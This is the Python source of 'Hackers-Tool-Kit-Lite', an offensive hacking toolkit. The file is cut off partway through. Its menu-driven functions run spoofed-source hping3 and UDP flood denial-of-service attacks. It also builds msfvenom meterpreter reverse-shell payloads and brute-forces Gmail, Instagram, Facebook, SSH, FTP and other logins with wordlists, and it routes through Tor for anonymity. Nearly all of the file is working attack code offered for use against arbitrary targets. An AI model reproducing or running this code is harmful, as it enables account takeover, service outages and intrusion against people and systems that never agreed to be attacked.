#!/usr/local/bin/python
# coding: latin-1
#if you use this code give me credit @tuf_unkn0wn
#i do not give you permission to show / edit this script without my credit
#to ask questions or report a problem message me on instagram @tuf_unkn0wn
"""


 ██░ ██  ▄▄▄       ▄████▄   ██ ▄█▀▓█████ ▓█████▄ 
▓██░ ██▒▒████▄    ▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▒██▀ ██▌
▒██▀▀██░▒██  ▀█▄  ▒▓█    ▄ ▓███▄░ ▒███   ░██   █▌
░▓█ ░██ ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ░▓█▄   ▌
░▓█▒░██▓ ▓█   ▓██▒▒ ▓███▀ ░▒██▒ █▄░▒████▒░▒████▓ 
 ▒ ▒░▒ ▒▒   ▓▒█ ░▒ ▒  ░▒ ▒▒ ▓▒ ▒░ ░ ▒▒▓  ▒ 
 ▒ ░▒░ ░  ▒   ▒▒ ░  ░  ▒   ░ ░▒ ▒░ ░ ░  ░ ░ ▒  ▒ 
 ░   ░  ░   ▒   ░        ░  ░    ░    ░ ░  ░ 
 ░  ░  ░      ░   ░      ░  ░      ░  ░   ░    
                  ░                       ░      


"""
import smtplib
import random
import requests
import os
import sys
import socks
import socket
import readline
import time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
os.system("clear")
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
Gb = random._urandom(20000)
bytes = random._urandom(20000)
Kb = random._urandom(20000)

os.system("printf '\e[8;27;100t'")
os.system("printf '\033]2;Hackers-Tool-Kit-Lite | HTK-Lite | @tuf_unkn0wn\a'")

r = '\033[31m'
W = '\033[90m'
R = '\033[91m'
N = '\033[0m'
G = '\033[92m'
B = '\033[94m'
Y = '\033[93m'
LB = '\033[1;36m'
P = '\033[95m'
Bl = '\033[30m'
O = '\033[33m'
p = '\033[35m'
BD = '\033[1m'

lred = '\033[91m'
lblue = '\033[94m'
lgreen = '\033[92m'
yellow = '\033[93m'
cyan = '\033[1;36m'
purple = '\033[95m'
red = '\033[31m'
green = '\033[32m'
blue = '\033[34m'
orange = '\033[33m'

colorlist = [red, blue, green, yellow, lblue, purple, cyan, lred, lgreen, orange]
randomcolor = random.choice(colorlist)
banner3list = [red, blue, green, purple]
inputlist = ['☢', '☣', '☠', '♠', '❖', '⚛', '☘', '♞', '⚄', '⚒', '⚓', '⚔', '⬖', '⬗', '⬘', '⬙']


def starting():
	os.system("service tor start")
	os.system("service postgresql start")

	os.system("clear")

	for x in range(5): 

		print(random.choice(colorlist) + "##########")

		time.sleep(0.1)

		os.system("clear")

		print(random.choice(colorlist) + "++########")

		time.sleep(0.1)

		os.system("clear")

		print(random.choice(colorlist) + "++++######")

		time.sleep(0.1)

		os.system("clear")

		print(random.choice(colorlist) + "++++++####")

		time.sleep(0.1)

		os.system("clear")

		print(random.choice(colorlist) + "++++++++##")

		time.sleep(0.1)

		os.system("clear")





def mainbanner1():
	print """\033[1;36m
       ┬  ┬┌┬┐┌─┐\033[0m  
       │  │ │ ├┤ \033[1;36m  
       ┴─┘┴ ┴ └─┘ \033[0m 
██╗  ██╗████████╗██╗  ██╗
██║  ██║╚══██╔══╝██║ ██╔╝\033[1;36m
███████║   ██║   █████╔╝ \033[0m
██╔══██║   ██║   ██╔═██╗ 
██║  ██║   ██║   ██║  ██╗
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝
	\n""".decode('utf-8')

def mainbanner2():
	print """
                ░░▒█████████
              ▒▓▓█████████████
            ░▓█████████████████████░ ░▒███▓ 
          ░▓██████████████████████████████████ 
        ░░▒▓▓▓███████████┬  ┬┌┬┐┌─┐████████████▓  
     ░▓██████▓▓██████████│  │ │ ├┤ █████████████▓░
  ░▓██████▓███████▓██████┴─┘┴ ┴ └─┘████████████████░
    ░░▒░░░░▒▒▒▓▓░░▒███████████████████████████▓▓▓░   
                 ░░░▒░░░▒▓▓▒░▒▒░▒▓████████▓▓██▒▒░ 
                                ░▒░░░░░░▒░░░░░░░  
	\n""".decode('utf-8')

def mainbanner3():
	print """
╔═══════════════════════════════════════════════╗
║                                               ║
║     {0}    ██░ ██ ▄▄▄█████▓ ██ ▄█▀ ██▓ \033[0m          ║
║     {1}   ▓██░ ██▒▓  ██▒ ▓▒ ██▄█▒ ▓██▒  \033[0m         ║
║      {2}  ▒██▀▀██░▒ ▓██░ ▒░▓███▄░ ▒██░   \033[0m        ║
║      {3}  ░▓█ ░██ ░ ▓██▓ ░ ▓██ █▄ ▒██░           \033[0m║
║      {4}  ░▓█▒░██▓  ▒██▒ ░ ▒██▒ █▄░██████▒       \033[0m║
║       {5}  ▒ ░░▒░▒  ▒ ░░   ▒ ▒▒ ▓▒░ ▒░▓  ░       \033[0m║
║       {6}  ▒ ░▒░ ░    ░    ░ ░▒ ▒░░ ░ ▒  ░       \033[0m║
║       {7}  ░  ░░ ░  ░      ░ ░░ ░   ░ ░          \033[0m║
║       {8}  ░  ░  ░         ░  ░       ░  ░       \033[0m║
║                                               ║
║                                               ║
╚═══════════════════════════════════════════════╝
	""".decode('utf-8').format(random.choice(banner3list), random.choice(banner3list), random.choice(banner3list), random.choice(banner3list), random.choice(banner3list), random.choice(banner3list), random.choice(banner3list), random.choice(banner3list), random.choice(banner3list))

def mainbanner4():
	print """\033[0m
████████████████████████████████████████████████████████████████████████████\033[91m
███  ███████  ██          █   ███   ███████    ████████ ██      ████████████\033[33m
████ ███████ ██████    █████ ██  █████████ █  █ █████████ ██  ██ ██████  ███\033[93m
████  █████  ███████  ██████   █████████████  ████████   ███  █████     ████\033[92m
████         ██████    █████  █████████████    ██████ █ █ ██  ██ █ █████ ███\033[94m
████  █████  ███████  ██████   █████████████  █████████ ████  ███        ███\033[1;36m
████ ███████ ███████  ██████ ██  ███████████  █████ ███ ████  ██ █ █████████\033[95m
███   █████   █████    ████   ███   ████████        ██   ███  ████       ███\033[0m
████████████████████████████████████████████████████████████████████████████
	\033[0m\n""".decode('utf-8')

def mainbanner5():
	print """\033[92m
                                                
  █ ▄    ▄ █                    ▄███▄           ▄██ ▄███▀
  ███    ███                 ▄█████████▄        ███▐██▀
  ███    ███                 ██▀▀███▀▀██        █████▀
  ███▄▄▄▄███                 ▀   ███   ▀       ██████▄
  ███▀▀▀▀███                 ▄   ███   ▄        ███▐██▄
  ███    ███ \033[0m┌─┐┌─┐┬┌─┌─┐┬─┐┌─┐  \033[92m███  \033[0m┌─┐┌─┐┬   \033[92m███ ▀███▄ \033[0m┬┌┬┐\033[92m
  ███    ███ \033[0m├─┤│  ├┴┐├┤ ├┬┘└─┐  \033[92m███  \033[0m│ ││ ││   \033[92m███    ██ \033[0m│ │ \033[92m
  █        █ \033[0m┴ ┴└─┘┴ ┴└─┘┴└─└─┘ \033[92m▀███▀ \033[0m└─┘└─┘┴─┘ \033[92m▀       ▀ \033[0m┴ ┴\033[92m


            
                ███    
                █ █        
                █ █        ██ ████████ ███████
                █ █        ██    ██    ██  
                █ █        ██    ██    █████
                █ █     ▄  ██    ██    ██
                █████▄▄██  ██    ██    ███████
         

	""".decode('utf-8')

def mainbanner6():
	print """
 • \033[35m▄█\033[0m .  \033[35m█▄  \033[0m.     \033[35m███  \033[0m.  •  \033[35m▄█   ▄█▄\033[0m. \033[35m▄█ \033[0m•      
  \033[35m█#█    █#█\033[0m•  \033[35m▀████=████▄\033[0m.  \033[35m███ ▄█ █▀ █⇣█ \033[0m.      
. \033[35m█#█ \033[0m. •\033[35m█#█ \033[0m.    \033[35m▀█-█▀▀██  \033[0m.\033[35m█ █▐ █▀ \033[0m• \033[35m█L█   \033[0m.    
 \033[35m▄███▄▄▄▄███▄▄   \033[0m. \033[35m█▪█ \033[0m. \033[35m▀  ▄█████▀   \033[0m.\033[35m█i█      
▀▀█+█▀▀▀▀█+█▀  \033[0m•   \033[35m█▪█   \033[0m. \033[35m▀▀█ █ █▄\033[0m.   \033[35m█t█    \033[0m.  
 .\033[35m█•█  \033[0m. \033[35m█•█ \033[0m.     \033[35m█▪█  \033[0m•    \033[35m███▐ █▄ \033[0m. \033[35m█e█  \033[0m.     
  \033[35m█+█    █+█   \033[0m.   \033[35m█▪█    \033[0m.  \033[35m█ █\033[0m.\033[35m▀█ █▄ █⇡█▌  \033[0m• \033[35m▄ 
\033[0m• \033[35m███   \033[0m.\033[35m█▀  \033[0m.   \033[35m ▄████▀ \033[0m.   \033[35m███ \033[0m. \033[35m▀█▀ █████▄▄██ 
    \033[0m .           .  .     .  \033[35m▀        \033[0m•\033[35m▀\033[0m]         
	""".decode('utf-8')
def mainbanner7():
	print """\033[31m
██╗  ██╗████████╗██╗  ██╗     ██╗     ██╗████████╗███████╗
██║  ██║╚\033[91m══██╔══╝██║ ██╔╝     ██║     ██║╚══██╔══╝██╔════╝
███████║   ██║   █████╔╝████\033[33m█╗██║     ██║   ██║   █████╗  
██╔══██║   ██║   ██╔═██╗╚════╝\033[93m██║     ██║   ██║   ██╔══╝  
██║  ██║   ██║   ██║  ██╗     ███████╗██║   ██║   ███████╗
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝     ╚══════╝╚═╝   ╚═╝   ╚══════╝\033[0m
	""".decode('utf-8')

def mainbanner8():
	print """\033[34m
██╗  ██╗████████╗██╗  ██╗     ██╗     ██╗████████╗███████╗
██║  ██║╚══██╔══╝██║ ██╔╝     ██║     ██║╚══██╔══╝██╔════╝
███████║   ██║   █████╔╝█████╗█\033[94m█║     ██║   ██║   █████╗  
██╔══██║   ██║   ██╔═██╗╚════╝██║     ██║   ██║   ██╔══╝  
██║  ██║   █\033[1;36m█║   ██║  ██╗     ███████╗██║   ██║   ███████╗
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝     ╚══════╝╚═╝   ╚═╝   ╚══════╝
	\033[0m""".decode('utf-8')

def mainbanner9():
	print """\033[93m
██╗  ██╗████████╗██╗  ██╗     ██╗     ██╗████████╗███████╗
██║  ██║╚══██╔══╝██║ ██╔╝     ██║     ██║╚══██╔══╝██╔════╝
███\033[92m████║   ██║   █████╔╝█████╗██║     ██║   ██║   █████╗  
██╔══██║   ██║   ██╔═██╗╚════╝\033[32m██║     ██║   ██║   ██╔══╝  
██║  ██║   ██║   ██║  ██╗     ███████╗██║   ██║   ███████╗
╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝     ╚══════╝╚═╝   ╚═╝   ╚══════╝
	\033[0m""".decode('utf-8')

def mainbanner():
	import random
	for x in range(10):
	  num = random.randint(1,9)
	if num == 1:
		mainbanner1()
	if num == 2:
		mainbanner2()
	if num == 3:
		mainbanner3()
	if num == 4:
		mainbanner4()
	if num == 5:
		mainbanner5()
	if num == 6:
		mainbanner6()
	if num == 7:
		mainbanner7()
	if num == 8:
		mainbanner8()
	if num == 9:
		mainbanner9()

def helpbanner():
	a = os.popen("ls commandlist -1 | wc -l").read()
	b = a.replace('\n', '')
	print """
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║   \033[92m     ██░ ██ ▓█████  ██▓     ██▓███          \033[0m           ║
║   \033[90m    ▓██░ ██▒▓█   ▀ ▓██▒    ▓██░  ██▒        \033[0m           ║
║   \033[92m    ▒██▀▀██░▒███   ▒██░    ▓██░ ██▓▒        \033[0m           ║
║   \033[90m    ░▓█ ░██ ▒▓█  ▄ ▒██░    ▒██▄█▓▒ ▒        \033[0m           ║
║   \033[92m    ░▓█▒░██▓░▒████▒░██████▒▒██▒ ░  ░        \033[0m           ║
║   \033[94m     ▒ ░░▒░▒░░ ▒░ ░░ ▒░▓  ░▒▓▒░ ░  ░        \033[0m           ║
║   \033[90m     ▒ ░▒░ ░ ░ ░  ░░ ░ ▒  ░░▒ ░             \033[0m           ║
║   \033[94m     ░  ░░ ░   ░     ░ ░   ░░               \033[0m           ║
║   \033[90m     ░  ░  ░   ░  ░    ░  ░  \033[0m                          ║
║                                                          ║
║══════════════════════════════════════════════════════════║
║             Commands: [\033[32m{0}\033[0m]    Banners: [\033[31m9\033[0m]                ║  
║══════════════════════════════════════════════════════════════════════════════════════╗
║ ?        | this menu                                                                 ║
║ exit     | exit htkl                                                                 ║
║ reboot   | reboot htkl                                                               ║
║ clear    | clears screen                                                             ║
║ banner   | shows a banner                                                            ║
║ command  | run a terminal command                                                    ║
║ terminal | open another terminal                                                     ║
║ sysinfo  | gather information about your device                                      ║
║ infoscan | gather information on a host [for a more specific scan type infoscan -o]  ║
║ dos      | run Denial-Of-Service attacks                                             ║
║ payload  | Make a msf payload                                                        ║
║ password | crack social media, service and wifi passwords                            ║
║ monitor  | turn monitor mode on and off [monitor on | monitor off]                   ║
║ anon     | make yourself anonymous [anon on | anon off]                              ║
║ netscan  | gather information about your network                                     ║
║ verscan  | scan for a service version on a host                                      ║
║ wordlist | make wordlists                                                            ║
║ arpspoof | ARP Spoofing                                                              ║
║ traff    | show internet traffic                                                     ║
║ hashid   | find out what type of hash a hash is                                      ║
║ aserver  | start a apache server                                                     ║
║ dnsspoof | DNS Spoofing  [to dns spoof subnet type dnsspoof --all]                   ║
║                                                                                      ║
║                                                                                      ║
║                                                                                      ║
║                                      \033[5m@tuf_unkn0wn\033[0m                                    ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
	\033[0m\n""".format(b)

def infoscan():
	try:
		target = raw_input("\033[1mTarget:\033[0m ")
		port = raw_input("\033[1mPort:\033[0m ")
		print "\033[93m! HTTP OR HTTPS !\033[0m\n"
		ht = raw_input("[https/http]: ")
		if ht == "http":
			targetht = 'http://'
		if ht == "https":
			targetht = 'https://'
		print "\033[31m-----\033[33m-----\033[93m-----\033[32m-----\033[1;36m-----\033[94m-----\033[95m-----\033[31m-----\033[33m-----\033[93m-----\033[32m-----\033[1;36m-----\033[94m-----\033[95m-----\033[0m\n"
		os.system("curl {0}".format(target))
		print "\n"
		ip = socket.gethostbyname(target)
		print G+"------------------------\033[0m"
		print N+"\033[1mHost:\033[32m ", target
		print N+"\033[1mIP:\033[32m ", ip
		print G+"------------------------\033[0m"
		os.system("curl -I {0}".format(target))
		print "\n"
		request = requests.get(targetht + target)
		http = request.status_code
		if http == 200:
			print("\nServer: [\033[32monline\033[0m]")
		else:
			print("\nServer: [\033[31moffline\033[0m]")
			exit()
		print "\n"
		whois = requests.get("https://api.hackertarget.com/whois/?q=" + target).content.decode("UTF-8")
		print(whois)
		print "\n"
		os.system("curl https://api.hackertarget.com/dnslookup/?q={0}".format(target))
		print "\n"
		os.system("wafw00f {0}".format(target))
		print "\n"
		os.system("sslscan {0}".format(target))
		print "\n"
		os.system("curl https://api.hackertarget.com/geoip/?q={0}".format(target))
		print "\n"
		os.system("curl https://api.hackertarget.com/reverseiplookup/?q={0}".format(target))
		print "\n"
		os.system("curl https://api.hackertarget.com/hostsearch/?q={0}".format(target))
		print "\n"
		os.system("curl https://api.hackertarget.com/reversedns/?q={0}".format(target))
		print "\n"
		os.system("curl https://api.hackertarget.com/findshareddns/?q={0}".format(target))
		print "\n"
		def daf():
		     subdomainlist = ["ftp", "cpanel", "webmail", "localhost", "local", "mysql", "forum", "driect-connect", "blog",
		                         "vb", "forums", "home", "direct", "forums", "mail", "access", "admin", "administrator",
		                         "email", "downloads", "ssh", "owa", "bbs", "webmin", "paralel", "parallels", "www0", "www",
		                         "www1", "www2", "www3", "www4", "www5", "shop", "api", "blogs", "test", "mx1", "cdn", "mysql",
		                         "mail1", "secure", "server", "ns1", "ns2", "smtp", "vpn", "m", "mail2", "postal", "support",
		                         "web", "dev"]
		
		     for sublist in subdomainlist:
		         try:
		             hosts = str(sublist) + "." + str(target)
		             showip = socket.gethostbyname(str(hosts))
		             print "\033[0m\033[32mHIT\033[0m:\033[1m " + str(showip) + ' | ' + str(hosts)
		         except:
		             print "\033[0mBypassing..."
		
		daf()
		print "\033[0m"
		print "\n"
		os.system("nmap -A {0}".format(target))
		print "\n"
		os.system("nmap --script dns-brute {0}".format(target))
		print "\n"
		a = 'dirb {0}{1}/'.format(targetht,target)
		os.system(a)
		print "\n"
		os.system("nikto -h {0} -p {1}".format(target,port))
		print "\n\033[31m-----\033[33m-----\033[93m-----\033[32m-----\033[1;36m-----\033[94m-----\033[95m-----\033[31m-----\033[33m-----\033[93m-----\033[32m-----\033[1;36m-----\033[94m-----\033[95m-----\033[0m"
	except:
		print "\033[91mError Something Went Wrong Maybe The Specified Target Is Not Available\033[0m"

def specscan():
	print """\033[1m
Scans Available:\033[0m

1:  simple nmap portscan

2:  show document info of target with curl
 
3:  nmap OS detection, version detection, script scanning, and traceroute scan

4:  nmap dns bruteforce

5:  get a hosts ip address

6:  check if a host is online

7:  who-is lookup

8:  dns-lookup

9:  get a hosts source code

10: web application firewall scanner

11: run a ssl scan

12: find the location of a ip address

13: reverse ip lookup

14: host search

15: reverse dns 

16: find shared dns

17: cloudflare bypass

18: sslscan

19: directory scan / bruteforce

20: nikto scan [this might take awhile to finish]

go back: go back to main menu

	"""
	print "Type a number then your target   Ex: 5 www.pornhub.com\n"
	j = False
	while not j:
		try:
			option, target = raw_input("\033[1mScan:\033[0m ").split()
			if option == "1":
				os.system("nmap {0}".format(target))
			if option == "2":
				os.system("curl -I {0}".format(target))
			if option == "3":
				os.system("nmap -A {0}".format(target))
			if option == "4":
				os.system("nmap --script dns-brute {0}".format(target))
			if option == "5":
				ip = socket.gethostbyname(target)
				print """
		Host: {0}
		IP: {1}
				""".format(target, ip)
			if option == "6":
				ht = raw_input("\033[1mHTTP or HTTPS:\033[0m ")
				if ht == "https":
					targetht = "https://"
				if ht == "http":
					targetht = "http://"
				request = requests.get(targetht + target)
				http = request.status_code
				if http == 200:
					print("\nServer: [\033[32monline\033[0m]")
				else:
					print("\nServer: [\033[31moffline\033[0m]")
			if option == "7":
				whois = requests.get("https://api.hackertarget.com/whois/?q=" + target).content.decode("UTF-8")
				print(whois)
			if option == "8":
				os.system("curl https://api.hackertarget.com/dnslookup/?q={0}".format(target))
			if option == "9":
				os.system("curl {0}".format(target))
			if option == "10":
				os.system("wafw00f {0}".format(target))
			if option == "11":
				os.system("sslscan {0}".format(target))
			if option == "12":
				os.system("curl https://api.hackertarget.com/geoip/?q={0}".format(target))
			if option == "13":
				os.system("curl https://api.hackertarget.com/reverseiplookup/?q={0}".format(target))
			if option == "14":
				os.system("curl https://api.hackertarget.com/hostsearch/?q={0}".format(target))
			if option == "15":
				os.system("curl https://api.hackertarget.com/reversedns/?q={0}".format(target))
			if option == "16":
				os.system("curl https://api.hackertarget.com/findshareddns/?q={0}".format(target))
			if option == "17":
				def daf():
				     subdomainlist = ["ftp", "cpanel", "webmail", "localhost", "local", "mysql", "forum", "driect-connect", "blog",
				                         "vb", "forums", "home", "direct", "forums", "mail", "access", "admin", "administrator",
				                         "email", "downloads", "ssh", "owa", "bbs", "webmin", "paralel", "parallels", "www0", "www",
				                         "www1", "www2", "www3", "www4", "www5", "shop", "api", "blogs", "test", "mx1", "cdn", "mysql",
				                         "mail1", "secure", "server", "ns1", "ns2", "smtp", "vpn", "m", "mail2", "postal", "support",
				                         "web", "dev"]
				
				     for sublist in subdomainlist:
				         try:
				             hosts = str(sublist) + "." + str(target)
				             showip = socket.gethostbyname(str(hosts))
				             print "\033[0m\033[32mHIT\033[0m:\033[1m " + str(showip) + ' | ' + str(hosts)
				         except:
				             print "\033[0mBypassing..."
				
				daf()
			if option == "18":
					a = 'sslscan {0}'.format(target)
					os.system(a)
			if option == "19":
				ht = raw_input("HTTP or HTTPS: ")
				if ht == "https":
					targetht = "https://"
				if ht == "http":
					targetht = "http://"
				a = 'dirb {0}{1}/'.format(targetht,target)
				os.system(a)
			if option == "20":
				port = raw_input("\033[1mPort:\033[0m ")
				os.system("nikto -h {0} -p {1}".format(target,port))
			if target == "back":
				break
		except:
			print "\n"
			break
	j = True


def dos():
	print """
{0}tcp: * tcp target port
{1}udp: * udp target port
{2}syn: * syn target port
{3}ack: * ack target port
{4}xmas: * xmas target port
\033[0m
!Press CTRL C to stop attacking!
	""".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
	try:
		command, target, port = raw_input("\033[1mMethod:\033[0m ").split()
		if command == "tcp":
			os.system("service tor restart")
			os.system("hping3 --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
		if command == "udp":
			try:
				ip = socket.gethostbyname(target)
				port = int(port)
				os.system("service tor restart")
				sent = 0						
				while True:
					print N+"UDP attack sending | {6}{5}\033[0m | {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year,ip,random.choice(colorlist))
					sock.sendto(Gb, (ip,port))
					sock.sendto(bytes, (ip,port))
					sock.sendto(Kb, (ip,port))
					sent = sent + 1
					port = port + 1
					if port == 65534:
						port = 1
			except:
				print "\nUDP flood stopped\n"
				os.system("")
		if command == "syn":
			os.system("service tor restart")
			os.system("hping3 -S --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
		if command == "ack":
			os.system("service tor restart")
			os.system("hping3 -A --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
		if command == "xmas":
			os.system("hping3 -X --flood -d 50000 --rand-source -p {0} {1}".format(port,target))
	except:
		print "\n\033[91mError: Not Enough Arguments\033[0m\n "


def payload():
	print """\033[0m033[1m
Payloads Available:\033[0m

{0}1: windows/meterpreter/reverse_tcp

{1}2: android/meterpreter/reverse_tcp

{2}3: php/meterpreter/reverse_tcp

{3}4: python/meterpreter/reverse_tcp

{4}5: ruby/shell_reverse_tcp

{5}6: osx/x86/vforkshell/reverse_tcp

{6}7: linux/aarch64/meterpreter/reverse_tcp

	\033[0m""".format(random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist), random.choice(colorlist))
	choice = raw_input("\033[1mPayload:\033[0m ")
	lhost = raw_input("\033[1mLHOST: \033[0m")
	lport = raw_input("\033[1mLPORT: \033[0m")
	name = raw_input("\033[1mFilename: \033[0m")
	if choice == "1":
		payload = 'msfvenom -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.exe'.format(lhost, lport, name)
		os.system(payload)
	if choice == "2":
		payload = 'msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.apk'.format(lhost, lport, name)
		os.system(payload)
	if choice == "3":
		payload = 'msfvenom -p php/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.php'.format(lhost, lport, name)
		os.system(payload)
	if choice == "4":
		payload = 'msfvenom -p python/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.py'.format(lhost, lport, name)
		os.system(payload)
	if choice == "5":
		payload = 'msfvenom -p ruby/shell_reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.rb'.format(lhost, lport, name)
		os.system(payload)
	if choice == "6":
		payload = 'msfvenom -p osx/x86/vforkshell/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.app'.format(lhost, lport, name)
		os.system(payload)
	if choice == "7":
		payload = 'msfvenom -p linux/aarch64/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o /root/{2}.tar'.format(lhost, lport, name)
		os.system(payload)

def gmail():

  def main():
     print '\033[93m================================================='
     print '\033[91m               create by Ha3MrX                  '
     print '\033[93m================================================='
     print '\033[95m               ++++++++++++++++++++              '
     print '\n                                               '
     print '\033[92m  _,.                                            '
     print '                                                 '
     print '                                                 '
     print '           HA3MrX                                '
     print '       _,.                   '
     print '     ,` -.)                  '
     print '    ( _/-\\-._               '
     print '   /,|`--._,-^|            , '
     print '   \_| |`-._/||          , | '
     print '     |  `-, / |         /  / '
     print '     |     || |        /  /  '
     print '      `r-._||/   __   /  /   '
     print '  __,-<_     )`-/  `./  /    '
     print '  \   `---    \   / /  /     '
     print '     |           |./  /      '
     print '     /           //  /       '
     print ' \_/  \         |/  /        '
     print '  |    |   _,^- /  /         '
     print '  |    , ``  (\/  /_         '
     print '   \,.->._    \X-=/^         '
     print '   (  /   `-._//^`           '
     print '    `Y-.____(__}             '
     print '     |     {__)              ' 
     print '           () \033[91m  V.1.0        '

  main()
  print '\033[0m[1] start the attack'
  print '[2] exit'
  option = input('==>')
  if option == 1:
     file_path = raw_input('path of passwords file :')
  else:
     system('clear')
     exit()
  pass_file = open(file_path,'r')
  pass_list = pass_file.readlines()
  def login():
      i = 0
      user_name = raw_input('target email :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
           server.login(user_name, password)
           system('clear')
           main()
           print '\n'
           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
           break
        except smtplib.SMTPAuthenticationError as e:
           error = str(e)
           if error[14] == '<':
              system('clear')
              main()
              print '[+] this account has been hacked, password :' + password + '     ^_^'

              break
           else:
              print '[!] password not found => ' + password
  login()

def insta():
	insta = raw_input("\033[1mUsername:\033[0m ")
	jl = raw_input("\033[1mWordlist:\033[0m ")
	print "\033[1m\033[94m\nMODES>: [0] fastest, [1] fast, [2] slow, [3] slowest\033[0m\n"
	k = raw_input("\033[1mMode:\033[0m ")
	ma = 'python3 files/Instagram/instagram.py {0} {1} -m {2}'.format(insta,jl,k)
	os.system(ma)

def fb():
	facebook = raw_input("\033[1m[EMAIL/ID->]:\033[0m ")
	word = raw_input("\033[1m[WORDLIST->]:\033[0m ")
	ks = 'cd files && perl fb-brute.pl {0} {1}'.format(facebook,word)
	os.system(ks)
def blackhydra():
	def restart_program():
	   python = sys.executable
	   os.execl(python, python, * sys.argv)
	   curdir = os.getcwd()
	##############################

	os.system("clear")
	print B+"___  _    ____ ____ _  _    _  _ _   _ ___  ____ ____"
	print "|__] |    |__| |    |_/     |__|  \_/  |  \ |__/ |__|"
	print "|__] |___ |  | |___ | \_    |  |   |   |__/ |  \ |  |"
	print G+"-----------------------------------------------------"
	print N+"[]xxxxx[]::::::::::::::::::::> 24-07-2017 (7:53)"
	print R+" [*] Author: DedSecTL  ---  [*] Version 1.0"
	print N+"c=={:::::::::::::::> Black Hydra Console"
	print R+" [*] My FB : https://m.facebook.com/100004136748473"
	print N+"(}xxx{):::::::::> AndroSec1337 Cyber Team"
	print
	print "              ===|[ Brute Force ]|==="
	print
	print "  [01] Cisco Brute Force         "
	print "  [02] VNC Brute Force           "
	print "  [03] FTP Brute Force           "
	print "  [04] Gmail Brute Force         "
	print "  [05] SSH Brute Force           "
	print "  [06] TeamSpeak Brute Force     "
	print "  [07] Telnet Brute Force        "
	print "  [08] Yahoo Mail Brute Force    "
	print "  [09] Hotmail Brute Force       "
	print "  [10] Router Speedy Brute Force "
	print "  [11] RDP Brute Force           "
	print "  [12] MySQL Brute Force         "
	print
	print " [00] Exit"
	print
	bhydra = raw_input("[*] B-Hydra > ")

	if bhydra == '01' or bhydra == '1':
	  print
	  print "          +---------------------------+"
	  print "          |     Cisco Brute Force     |"
	  print "          +---------------------------+"
	  print
	  print
	  iphost = raw_input("[*] IP/Hostname : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -P %s %s cisco" % (word, iphost))
	  sys.exit()
	  
	elif bhydra == '02' or bhydra == '2':
	  print
	  print "          +---------------------------+"
	  print "          |      VNC Brute Force      |"
	  print "          +---------------------------+"
	  print
	  print
	  word = raw_input("[*] Wordlist : ")
	  iphost = raw_input("[*] IP/Hostname : ")
	  os.system("hydra -P %s -e n -t 1 %s vnc -V" % (word, iphost))
	  iphost = raw_input("[*] IP/Hostname : ")
	  
	elif bhydra == '03' or bhydra == '3':
	  print
	  print "          +------------------------------+"
	  print "          |        FTP Brute Force       |"
	  print "          +------------------------------+"
	  print
	  print
	  user = raw_input("[*] User : ")
	  iphost = raw_input("[*] IP/Hostname : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s %s ftp" % (user, word, iphost))
	  sys.exit()
	  
	elif bhydra == '04' or bhydra == '4':
	  print
	  print "          +------------------------------+"
	  print "          |       Gmail Brute Force      |"
	  print "          +------------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 465 smtp.gmail.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '05' or bhydra == '5':
	   print
	   print "         +--------------------------------+"
	   print "         |        SSH Brute Force         |"
	   print "         +--------------------------------+"
	   print
	   print
	   user = raw_input("[*] User : ")
	   word = raw_input("[*] Wordlist : ")
	   iphost = raw_input("[*] IP/Hostname : ")
	   os.system("hydra -l %s -P %s %s ssh" % (user, word, iphost))
	   sys.exit()
	   
	elif bhydra == '06' or bhydra == '6':
		print
		print "        +-------------------------+"
		print "        |  TeamSpeak Brute Force  |"
		print "        +-------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -l %s -P %s -s 8676 %s teamspeak" % (user, word, iphost))
		sys.exit()

	elif bhydra == '07' or bhydra == '7':
		print
		print "        +-------------------------+"
		print "        |   Telnet Brute Force    |"
		print "        +-------------------------+"
		print
		print
		user = raw_input("[*] User : ")
		word = raw_input("[*] Wordlist : ")
		iphost = raw_input("[*] IP/Hostname : ")
		os.system("hydra -l %s -P %s %s telnet" % (user, word, iphost))
		sys.exit()
		
	elif bhydra == '08' or bhydra == '8':
	  print
	  print "          +---------------------------+"
	  print "          |     Yahoo Brute Force     |"
	  print "          +---------------------------+"
	  print
	  print
	  email = raw_input("[*] Email : ")
	  word = raw_input("[*] Wordlist : ")
	  os.system("hydra -l %s -P %s -s 587 smtp.mail.yahoo.com smtp" % (email, word))
	  sys.exit()
	  
	elif bhydra == '09' or bhydra == '9':
	  print
